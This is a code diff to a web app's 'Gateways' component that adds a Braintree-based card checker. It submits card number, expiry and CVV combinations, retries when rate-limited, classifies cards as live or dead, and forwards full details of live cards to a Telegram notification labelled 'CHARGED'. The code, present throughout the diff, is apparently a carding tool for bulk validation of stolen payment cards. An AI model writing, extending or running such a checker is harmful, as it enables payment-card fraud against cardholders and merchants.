@@ -746,6 +746,84 @@ const Gateways = () => {
     };
   };
 
+  // B3 API check (YUNCHI AUTH 3) via edge function with retry - returns status AND API response
+  const checkCardViaB3 = async (cardNumber: string, month: string, year: string, cvv: string, maxRetries = 5): Promise<GatewayApiResponse> => {
+    const cc = `${cardNumber}|${month}|${year}|${cvv}`;
+    
+    for (let attempt = 0; attempt <= maxRetries; attempt++) {
+      try {
+        console.log(`[B3-AUTH] Checking card (attempt ${attempt + 1}/${maxRetries + 1}):`, cc);
+        
+        const { data, error } = await supabase.functions.invoke('braintree-auth-check', {
+          body: { cc }
+        });
+        
+        if (error) {
+          console.error('[B3-AUTH] Edge function error:', error);
+          if (attempt < maxRetries) {
+            await new Promise(r => setTimeout(r, 500 + attempt * 200));
+            continue;
+          }
+          return {
+            status: "unknown",
+            apiStatus: "ERROR",
+            apiMessage: error.message || "Edge function error",
+            rawResponse: JSON.stringify(error)
+          };
+        }
+        
+        console.log('[B3-AUTH] API response:', data);
+        
+        // Extract real API response data
+        const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
+        const apiMessage = data?.apiMessage || data?.message || 'No message';
+        const rawResponse = JSON.stringify(data);
+        
+        // Use computedStatus from edge function if available
+        const computedStatus = data?.computedStatus;
+        if (computedStatus === "live" || computedStatus === "dead") {
+          return { status: computedStatus, apiStatus, apiMessage, rawResponse };
+        }
+        
+        // Fallback: Check message for status indicators
+        const message = (data?.message as string)?.toLowerCase() || '';
+        
+        if (message.includes("approved") || message.includes("success") || message.includes("authorized")) {
+          return { status: "live", apiStatus, apiMessage, rawResponse };
+        } else if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
+          return { status: "dead", apiStatus, apiMessage, rawResponse };
+        } else if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
+          console.log(`[B3-AUTH] Retryable error detected: ${message}`);
+          if (attempt < maxRetries) {
+            await new Promise(r => setTimeout(r, 800 + attempt * 300));
+            continue;
+          }
+          return { status: "unknown", apiStatus, apiMessage, rawResponse };
+        } else {
+          return { status: "unknown", apiStatus, apiMessage, rawResponse };
+        }
+      } catch (error) {
+        console.error('[B3-AUTH] API check error:', error);
+        if (attempt < maxRetries) {
+          await new Promise(r => setTimeout(r, 500 + attempt * 200));
+          continue;
+        }
+        return {
+          status: "unknown",
+          apiStatus: "ERROR",
+          apiMessage: error instanceof Error ? error.message : "Unknown error",
+          rawResponse: String(error)
+        };
+      }
+    }
+    return {
+      status: "unknown",
+      apiStatus: "ERROR",
+      apiMessage: "Max retries exceeded",
+      rawResponse: "Max retries exceeded"
+    };
+  };
+
   // Fallback simulation for non-API gateways
   const simulateCheck = async (): Promise<"live" | "dead" | "unknown"> => {
     await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 700));
@@ -781,11 +859,13 @@ const Gateways = () => {
       // For auth gateways, use 000 as CVV internally if not provided
       const internalCvv = cvv || "000";
 
-      // Use real API for YUNCHI AUTH gateway and PAYGATE, simulation for others
+      // Use real API for YUNCHI AUTH gateways and PAYGATE, simulation for others
       let gatewayResponse: GatewayApiResponse | null = null;
       
       if (selectedGateway.id === "stripe_auth") {
         gatewayResponse = await checkCardViaApi(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
+      } else if (selectedGateway.id === "braintree_auth") {
+        gatewayResponse = await checkCardViaB3(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
       } else if (selectedGateway.id === "paygate_charge") {
         gatewayResponse = await checkCardViaPaygate(cardNumber.replace(/\s/g, ''), expMonth, expYear, internalCvv);
       }
@@ -861,6 +941,27 @@ const Gateways = () => {
               response_message: realResponseMessage,
               amount: gatewayResponse.apiTotal || "$14.00",
               gateway: "PAYGATE",
+              api_response: gatewayResponse.rawResponse
+            }
+          });
+        } catch (notifyError) {
+          console.log("Failed to send Telegram notification:", notifyError);
+        }
+      }
+
+      // Send Telegram notification for B3 checks (LIVE ONLY - user requested no declined cards)
+      if (selectedGateway.id === "braintree_auth" && gatewayResponse && checkStatus === "live") {
+        try {
+          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+          
+          await supabase.functions.invoke('notify-charged-card', {
+            body: {
+              user_id: userId,
+              card_details: fullCardString,
+              status: "CHARGED",
+              response_message: realResponseMessage,
+              amount: "$0 Auth",
+              gateway: "YUNCHI AUTH 3",
               api_response: gatewayResponse.rawResponse
             }
           });
@@ -1448,11 +1549,13 @@ const Gateways = () => {
       const cardData = cards[cardIndex];
 
       try {
-        // Use real API for YUNCHI AUTH gateway and PAYGATE, simulation for others
+        // Use real API for YUNCHI AUTH gateways and PAYGATE, simulation for others
         let gatewayResponse: GatewayApiResponse | null = null;
         
         if (selectedGateway.id === "stripe_auth") {
           gatewayResponse = await checkCardViaApi(cardData.card, cardData.month, cardData.year, cardData.cvv);
+        } else if (selectedGateway.id === "braintree_auth") {
+          gatewayResponse = await checkCardViaB3(cardData.card, cardData.month, cardData.year, cardData.cvv);
         } else if (selectedGateway.id === "paygate_charge") {
           gatewayResponse = await checkCardViaPaygate(cardData.card, cardData.month, cardData.year, cardData.cvv);
         }
@@ -1531,6 +1634,27 @@ const Gateways = () => {
                 response_message: realResponseMessage,
                 amount: gatewayResponse.apiTotal || "$14.00",
                 gateway: "PAYGATE",
+                api_response: gatewayResponse.rawResponse
+              }
+            });
+          } catch (notifyError) {
+            console.log("Failed to send Telegram notification:", notifyError);
+          }
+        }
+
+        // Send Telegram notification for B3 checks (LIVE ONLY - user requested no declined cards)
+        if (selectedGateway.id === "braintree_auth" && gatewayResponse && checkStatus === "live") {
+          try {
+            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+            
+            await supabase.functions.invoke('notify-charged-card', {
+              body: {
+                user_id: userId,
+                card_details: fullCardStr,
+                status: "CHARGED",
+                response_message: realResponseMessage,
+                amount: "$0 Auth",
+                gateway: "YUNCHI AUTH 3",
                 api_response: gatewayResponse.rawResponse
               }
             });
